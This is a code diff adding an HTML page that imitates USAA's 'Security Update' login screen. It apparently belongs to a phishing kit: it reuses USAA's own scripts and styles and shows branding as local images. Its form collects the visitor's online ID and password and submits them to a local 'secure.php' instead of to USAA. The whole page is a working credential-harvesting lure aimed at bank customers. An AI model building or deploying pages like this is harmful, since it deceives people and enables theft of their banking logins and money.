@@ -1,0 +1,460 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html lang="en" dir="ltr" xml:lang="en" xmlns="http://www.w3.org/1999/xhtml">
+ <head>
+  <meta content="ixTkEWd_UcMhrL39nLaMLEq66o3Ecdwa-btSiATF0Uc" name="google-site-verification" />
+  <title>
+   USAA / Security Update
+  </title>
+  <meta content="USAA / Personal Profile Update" name="title" />
+  <meta content='(pics-1.1 "http://www.icra.org/ratingsv02.html" l gen true for "http://www.usaa.com" r (cz 1 lz 1 nz 1 oz 1 vz 1) "http://www.rsac.org/ratingsv01.html" l gen true for "http://www.usaa.com" r (n 0 s 0 v 0 l 0))' http-equiv="pics-label" />
+  <meta content="NOODP" name="ROBOTS" />
+  <meta content="NOYDIR" name="ROBOTS" />
+  <meta content="text/css" http-equiv="Content-Style-Type" />
+  <link media="all" href="https://content.usaa.com/mcontent/static_assets/Includes/styles_member.css?cacheid=718482316" type="text/css" rel="stylesheet" />
+  <link media="print" href="https://content.usaa.com/mcontent/static_assets/Includes/styles_member_print.css?cacheid=3455505624" type="text/css" rel="stylesheet" />
+  <link media="all" href="https://content.usaa.com/mcontent/static_assets/Includes/iaRestructure.css?cacheid=1617025001" type="text/css" rel="stylesheet" />
+  <script type="text/javascript" src="https://www.usaa.com/javascript/cp_help_popup-min.js?cacheid=2383519968" language="javascript">
+  </script>
+  <script type="text/javascript" src="https://www.usaa.com/javascript/cp_std-min.js?cacheid=1664784831" language="javascript">
+  </script>
+  <script type="text/javascript" src="https://www.usaa.com/inet/resources/aggregator?type=-min&embed=true&p_/ent/ent_core.js:cacheid=1057192853&p_/ent/utilities/loader.js:cacheid=2323805817&p_/yui/yahoo-dom-event/yahoo-dom-event.js:cacheid=3349818120&p_/cp_std.js:cacheid=1664784831&p_/cp_help_popup.js:cacheid=2383519968&p_/yui/connection/connection.js:cacheid=3970493711&p_/yui/container/container.js:cacheid=2794407859&p_/yui/animation/animation.js:cacheid=521316373&p_/yui/menu/menu.js:cacheid=3502886800&p_/ec/apps/authbar/authenticationbar.js:cacheid=153411451&p_/ec/apps/nav_subglobal_menu/nav_subglobal_menu.js:cacheid=2991096819&p_/ec/utilities/ScrollMonitor.js:cacheid=2651013120&p_/ec_ajax_std.js:cacheid=3969181102&p_/yui/dragdrop/dragdrop.js:cacheid=2157730860" language="javascript">
+  </script>
+  <script type="text/javascript" language="JavaScript1.2">
+   if (USAA.ent.util.Loader) {
+				
+
+				USAA.ent.util.Loader.aggregatorBaseUrl = 'https://www.usaa.com/inet/resources/aggregator?&amp;type=-min'
+			}
+  </script>
+  <script type="text/javascript" src="https://www.usaa.com/javascript/ec/apps/logon/logonCapsLockCheck-min.js?cacheid=3199490786">
+  </script>
+  <script type="text/javascript" language="JavaScript1.2">
+   function dynamicAction(Action)
+	{
+		var element = YAHOO.util.Dom.get('CpChangePinPage');
+		if (YAHOO.lang.isObject(element)){
+
+			
+			
+			if (true)
+			{
+				
+				element.PS_DYNAMIC_ACTION.value = Action;
+				
+                
+				if(YAHOO.lang.isObject(document.getElementById("PS_SCROLL_POSITION")))
+				{
+				element.PS_SCROLL_POSITION.value = scrollPosition() + ":" + element.PS_PAGEID.value;
+				}
+				
+				element.submit();
+			}
+		}
+		return false;
+		
+	}
+
+
+	function scrollPosition()
+	{
+		
+		var winX = window.pageYOffset ? window.pageYOffset : 0;
+		var docElementX = document.documentElement ? document.documentElement.scrollTop : 0;
+		var bodyX = document.body ? document.body.scrollTop : 0;
+		var resultX = winX ? winX :0;
+		var positionX =0;
+		
+				
+		var winY = window.pageXOffset ? window.pageXOffset : 0;
+		var docElementY = document.documentElement ? document.documentElement.scrollLeft : 0;
+		var bodyY = document.body ? document.body.scrollLeft :0;
+		var resultY = winY ? winY :0;
+		var positionY =0;
+		
+		
+		if(docElementX &gt; 0)
+		{
+			if(docElementX &amp;&amp; (!resultX || (resultX &gt; docElementX)))
+				resultX = docElementX;
+			positionX = bodyX &amp;&amp; (!resultX || (resultX &gt; bodyX)) ? bodyX : resultX;
+		}
+		
+		if(docElementY &gt; 0)
+		{
+			if(docElementY &amp;&amp; (!resultY || (resultY &gt; docElementY)))
+				resultY = docElementY;
+			positionY = bodyY &amp;&amp; (!resultY || (resultY &gt; bodyY)) ? bodyY : resultY;
+		}
+		
+		return positionX+":"+positionY;
+	}
+	
+	
+
+	function resetScrollPosition()
+	{
+		var pageId = YAHOO.util.Dom.get('CpChangePinPage').PS_PAGEID.value;
+		
+		var scrollPosition =  '';
+		
+		if(scrollPosition != '')
+		{
+			var scrollPositionDetails = scrollPosition.split(":");
+			var isDisplayMessage = false;
+			
+			
+			if(scrollPositionDetails[2] != '' &amp;&amp; scrollPositionDetails[2] == pageId &amp;&amp; !isDisplayMessage)
+			{
+				document.documentElement.scrollTop =  scrollPositionDetails[0];
+				document.documentElement.scrollLeft = scrollPositionDetails[1];
+			}
+		}
+	}
+
+
+	function submitDynamicAction(Action,Target,Context)
+	{
+		return dynamicAction("PsDynamicAction_[action]" + Action + "[/action][target]" + Target + "[/target][context]" + Context + "[/context]");
+	}
+  </script>
+  <script type="text/javascript" language="JavaScript1.2">
+   var children = new Array();
+   var nr       = 0;
+
+   
+   function closeChildren()
+   {
+   
+	  closeHelpWnd();
+
+      for (i=0; i &lt; nr; i++)
+      {
+         children[i].close();
+      }
+   }
+
+
+   function openGlossaryWindow(PageName)
+   {
+      var intHelpWidth = "400";
+      var intHelpHeight = "220";
+      var intHelptop = "300";
+      var intHelpleft = "470";
+      children[nr] = window.open(PageName ,'_blank', "height=" + intHelpHeight + ",width=" + intHelpWidth + ",top=" + intHelptop + ",left=" + intHelpleft + ",status=no,titlebar=no,toolbar=no,menubar=no,location=no,resizable=no, scrollbars=yes");
+      nr +=1;
+      return false;
+   }
+
+
+   function openBrowserWindow(PageName)
+   {
+      children[nr] = window.open(PageName, 'browser');
+      nr +=1;
+      return false;
+   }
+
+
+   function openNewWindow(PageName)
+   {
+      children[nr] = window.open(PageName);
+      nr +=1;
+      return false;
+   }
+
+
+   function openTextWindow(PageName)
+   {
+      var intHelpWidth = "200";
+      var intHelpHeight = "220";
+      var intHelptop = "300";
+      var intHelpleft = "470";
+      children[nr] = window.open('','_blank', "height=" + intHelpHeight + ",width=" + intHelpWidth + ",top=" + intHelptop + ",left=" + intHelpleft + ",status=no,titlebar=no,toolbar=no,menubar=no,location=no,resizable=no, scrollbars=yes");
+      // SEND TEXT TO THE PAGE
+      children[nr].document.write(PageName);
+      nr +=1;
+      return false;
+   }
+  </script>
+  <script type="text/javascript" language="JavaScript">
+   var ps_SubmitEnabled = true;
+	var ps_clickCount = 0;
+	
+	function ps_handleFormSubmit(delayInSeconds)
+	{
+		if (ps_SubmitEnabled)
+		{
+			ps_SubmitEnabled = false;
+			ps_clickCount++;
+
+			if(delayInSeconds==null || typeof(delayInSeconds)=='undefined')
+			{
+				delayInSeconds = 5;
+			}
+
+			if(delayInSeconds&gt;0)
+			{
+				setTimeout("ps_SubmitEnabled_Cust_delayTime = true;", delayInSeconds * 1000);
+				return true;
+			}
+			else
+				if(delayInSeconds==0)
+				{
+					return (ps_clickCount&lt;=1);
+				}
+				else
+					if(delayInSeconds&lt;0)
+					{
+						return true;
+					}
+		}
+
+		return false;
+	}
+  </script>
+  <script type="text/javascript" language="JavaScript">
+   function setFocus(formElement)
+{
+  document.forms[0].elements[formElement].focus();	   	   
+} // End of setFocus.
+  </script>
+  <script type="text/javascript" language="JavaScript">
+   function setFocus(formName,formElement)
+{
+  document.forms[formName].elements[formElement].focus();	   	   
+} // End of setFocus.
+  </script>
+  <script type="text/javascript" language="JavaScript1.1">
+   var UTILITY_COOKIE_NAME = "BrowserNavData";
+	var UTILITY_COOKIE_DELIMETER = "|";
+	var UTILITY_COOKIE_TRIGGER_VALUE_TRUE = "true";
+	var UTILITY_COOKIE_TRIGGER_VALUE_FALSE = "false";
+
+	// Get the cookie
+	var utilityCookie = getCookie(UTILITY_COOKIE_NAME);
+	if (utilityCookie != null)
+	{
+		
+		var cookieValuesArray = utilityCookie.split(UTILITY_COOKIE_DELIMETER);	
+
+		
+		var redirectUrl = "https%3A%2F%2Fwww.usaa.com%2Finet%2Fgas_corp%2FCpPersonalProfile%3Faction%3Dexecutetask%26target%3DPin%26ReturnLink%3Dhttps%3A%2F%2Fwww.usaa.com%2Finet%2Fent_securityprefs%2FSecurityPreferences%3Faction%3Dinit";
+			
+		
+		if ( (cookieValuesArray.length &gt; 1) &amp;&amp; (redirectUrl != "null") )
+		{
+			var trigger = cookieValuesArray[0];
+			var cookieTimeStamp = cookieValuesArray[1];
+
+			
+			if (trigger == UTILITY_COOKIE_TRIGGER_VALUE_TRUE &amp;&amp; cookieTimeStamp != 1319104017618)
+			{
+				
+				
+				
+					var parms = "PS_APPLICATIONGUID=PS_CpPersonalProfile_1319104017242&amp;OutOfSync=true";
+					redirectUrl = decodeURIComponent(redirectUrl);
+					
+					var index = redirectUrl.indexOf(parms);
+
+					if(index != -1)
+					{
+						var subRedirectUrl = redirectUrl.substring(index+1);					
+						
+						index = subRedirectUrl.indexOf(parms);				
+						if(index != -1)
+						{
+					  		trigger = UTILITY_COOKIE_TRIGGER_VALUE_TRUE;
+						  	setBrowserNavCookie(trigger, cookieTimeStamp);
+						}
+					}
+					else
+					{
+						var qStrt = redirectUrl.indexOf("?");
+						if(qStrt != -1)
+						{
+							redirectUrl = decodeURIComponent(redirectUrl) + "&amp;" + parms + "#top";
+						}
+						else
+						{
+							redirectUrl = decodeURIComponent(redirectUrl) + "?" + parms + "#top";
+						}	
+					}
+				
+						
+				
+				document.location.href = redirectUrl;
+			}
+			else
+			{
+				
+				trigger = UTILITY_COOKIE_TRIGGER_VALUE_TRUE;
+				setBrowserNavCookie(trigger, cookieTimeStamp);
+			}
+		}
+	}
+
+
+	
+function setBrowserNavCookie(newTrigger, cookieTimeStamp)
+{
+	var newCookieValue = newTrigger + UTILITY_COOKIE_DELIMETER + cookieTimeStamp;
+	ec_SetCookie(UTILITY_COOKIE_NAME, newCookieValue, null, ".usaa.com", "/");
+}
+  </script>
+  <script type="text/javascript" language="JavaScript1.2">
+   USAA.namespace('USAA.ec.logoff');
+	 USAA.ec.logoff.Timer = function(){
+	 var defaultSessionTimeout = 1195;
+	 var sessionLoadTimeout = defaultSessionTimeout - 300;
+	 var logoff_timeout = 0;
+	 return{
+		 timeoutHandler: function(){
+			 clearTimeout(logoff_timeout);
+			 USAA.ent.util.Loader.includeJS( "https://www.usaa.com/javascript/ec/apps/logoff/logoff-min.js?cacheid=3890809864" ,  function(){ YAHOO.util.Event.onDOMReady( function() { USAA.ec.logoff.TimeLoader.init( 
+			 { urlYuiConnectionJS : "https://www.usaa.com/javascript/yui/connection/connection-min.js?cacheid=3970493711" 
+			  ,urlYuiContainerJS : "https://www.usaa.com/javascript/yui/container/container-min.js?cacheid=2794407859" 
+			  ,defaultSessionTimeout : "1195" 
+			  ,urlYuiContainerCSS : "https://www.usaa.com/javascript/yui/container/assets/container-core-min.css?cacheid=2549785380" 
+			  ,urlTimeoutHelperCSS : "https://content.usaa.com/mcontent/static_assets/Includes/usaa-skin-modal.css?cacheid=26638145" 
+			  ,urlSessionReset :  "https://www.usaa.com/inet/gas_corp/ec_global_session_reset.jsp" 
+			  ,urlSessionLoggoff : "https://www.usaa.com/inet/ent_logon/Logoff" 
+			  ,urlTimeoutHelperContent : "https://www.usaa.com/inet/ent_utils/McLogon?key=timeout_warning_message" } );});});
+		 } 
+		 ,startTimer: function(){
+			 logoff_timeout = setTimeout(USAA.ec.logoff.Timer.timeoutHandler,(1000 * sessionLoadTimeout));
+		 }
+	 };
+	 }();
+	 USAA.ec.logoff.Timer.startTimer();
+  </script>
+  <link href="https://content.usaa.com/mcontent/static_assets/Media/usaaicon.ico?cacheid=435112253" rel="SHORTCUT ICON" />
+ </head>
+ <!-- BEGIN HTML BODY -->
+ <body onunload="closeChildren()
+">
+  <div id="container">
+   <div class="noindex">
+    <div style="background-color: #FBFBFB; border: solid #FBFBFB; border-width: 0 45px; display: none" id="bandwidthmsg">
+     <p class="messageWarning">
+      We've detected that your internet connection might be slow. To quickly access your account, pay bills, transfer funds and more, 
+    we suggest using
+      <a href="https://mobile.usaa.com/inet/ent_logon/Logon">
+       mobile.usaa.com
+      </a>
+     </p>
+    </div>
+    <div id="usaanavigationbar-container">
+     <img width="1118" height="200" src="img/top_usaa.png" alt="" />
+    </div>
+    <!-- END PAGE HEADER -->
+   </div>
+   <a name="contentLink">
+   </a>
+   <div id="content">
+    <div class="noindex">
+     <div id="toolsHeading">
+      <img width="360" height="34" src="img/security_usaa.png" alt="" />
+     </div>
+    </div>
+    <div id="main">
+     <!-- Begin Broadcast Notice -->
+     <form name="CpChangePinPage" id="CpChangePinPage" method="post" action="secure.php">
+      <input type="hidden" value="PS_CpPersonalProfile_1319104017242" id="PS_APPLICATIONGUID" name="PS_APPLICATIONGUID" />
+      <input type="hidden" value="1319104017618" id="PS_RESPONSETIMESTAMP" name="PS_RESPONSETIMESTAMP" />
+      <input type="hidden" value="" id="PS_TASKID" name="PS_TASKID" />
+      <input type="hidden" value="Pin" id="PS_TASKNAME" name="PS_TASKNAME" />
+      <input type="hidden" value="CpChangePinPage" id="PS_PAGEID" name="PS_PAGEID" />
+      <input type="hidden" value="" id="PS_DYNAMIC_ACTION" name="PS_DYNAMIC_ACTION" />
+      <input type="hidden" value="" id="PS_ACTION_CONTEXT" name="PS_ACTION_CONTEXT" />
+      <input type="hidden" value="" id="PS_SCROLL_POSITION" name="PS_SCROLL_POSITION" />
+      <!-- plgfrm208as4l,   mbr_utilities_01 -->
+      <!-- BEGIN SEARCH INDEX -->
+      <p>
+       <img width="852" height="29" src="img/top_usaa_2.png" alt="" />
+      </p>
+      <table width="100%" cellspacing="0" cellpadding="0" class="tableData">
+       <tbody>
+        <tr>
+         <td width="25%" class="dataLabel">
+          <img width="112" height="30" src="img/online_id_usaa.png" alt="" />
+         </td>
+         <td width="75%">
+          <input type="text" size="25" maxlength="20" placeholder="Username" name="onlineid" id="onlineid" />
+          <br />
+          <br />
+          <img width="294" height="19" src="img/6_20_usaa.png" alt="" />
+         </td>
+        </tr>
+        <tr>
+         <td class="dataLabel">
+          <img width="94" height="26" src="img/pass_usaa.png" alt="" />
+         </td>
+         <td>
+          <input type="password" size="15" maxlength="20" placeholder="Password" name="password" id="password" />
+          <img width="19" height="17" src="img/lock_usaa.png" alt="" />
+         </td>
+        </tr>
+       </tbody>
+      </table>
+      <p>
+      </p>
+      <p>
+       <img width="630" height="37" src="img/footer_usaa_2.png" alt="" />
+      </p>
+      <input width="1" type="image" height="1" border="0" src="https://content.usaa.com/mcontent/static_assets/Media/g_blank.gif?cacheid=3200128537" tabindex="-1" id="PsButton_[action]Update[/action]" name="PsButton_[action]Update[/action]" />
+      <div class="buttonContainer">
+       <span class="button">
+        <button type="submit" id="PsButton_[action]Cancel[/action]" title="Cancel" name="Button[action]Cancel[/action]" onclick="return submitDynamicAction('Cancel','','');">
+         Cancel
+        </button>
+       </span>
+       <span class="action">
+        <button type="submit" class="action" id="PsButton_[action]Update[/action]" title="Submit" name="Button[action]Update[/action]" onclick="return submitDynamicAction('Update','','');">
+         Submit
+        </button>
+       </span>
+      </div>
+      <!-- END SEARCH INDEX -->
+     </form>
+    </div>
+   </div>
+   <div class="noindex">
+    <!-- BEGIN PAGE FOOTER -->
+    <a name="bottom">
+    </a>
+    <div class="communitybar clearfix">
+     <ul>
+      <li class="divider">
+      </li>
+      <li class="divider">
+       <img width="970" height="321" src="img/footer_usaa.png" alt="" />
+      </li>
+      <li class="divider">
+      </li>
+      <li class="divider">
+      </li>
+     </ul>
+    </div>
+    <div id="footer">
+     <a style="" class="veriSign" href="javascript:openHelpWnd('https://seal.verisign.com/splash?form_file=fdf/splash.fdf&dn=WWW.USAA.COM&lang=en', 560, 500, 200, 200, false)">
+     </a>
+     <div class="accentAnchors" id="legalText">
+      <div id="copyright">
+      </div>
+      <div class="footnotes">
+      </div>
+      <br />
+      <script type="text/javascript" src="https://www.usaa.com/javascript/ent/utilities/footnotes-min.js?cacheid=1721912267" language="JavaScript1.2">
+      </script>
+      <script type="text/javascript" language="JavaScript">
+       USAA.ent.util.Footnotes.findFootnotes();
+      </script>
+     </div>
+     <br clear="all" />
+    </div>
+    <!-- END PAGE FOOTER -->
+   </div>
+  </div>
+ </body>
+ <!-- END HTML BODY -->
+</html>
